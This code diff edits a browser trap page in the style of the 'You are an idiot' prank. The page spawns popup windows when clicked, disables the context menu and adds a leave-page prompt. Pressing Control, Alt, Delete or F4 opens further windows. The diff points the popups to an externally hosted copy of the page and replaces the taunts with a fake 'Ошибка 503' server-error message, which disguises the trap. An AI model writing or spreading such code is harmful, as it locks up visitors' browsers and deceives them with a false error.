@@ -20,7 +20,7 @@ function openWindow(url) {
 
 async function proCreate(count) {	
 	for (let i = 0; i < count; i++) {
-		openWindow('lol.html');
+		openWindow('https://littlebear1643.github.io/lol/lol.html');
 		await new Promise(r => setTimeout(r, 50));
 	}
 }
@@ -61,7 +61,7 @@ function playBall() {
 
 document.querySelector('*').addEventListener('click', async () => {
 	await proCreate(1);
-	window.onbeforeunload = () => "Are you an idiot?";
+	window.onbeforeunload = () => "Ошибка 503";
 });
 
 window.onload = playBall;
@@ -69,7 +69,7 @@ window.oncontextmenu = () => false;
 window.onkeydown = async () => {
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
 		await proCreate(1);
-		alert("You are an idiot!");
+		alert("Ошибка 503");
 	}
 	
 	return null;
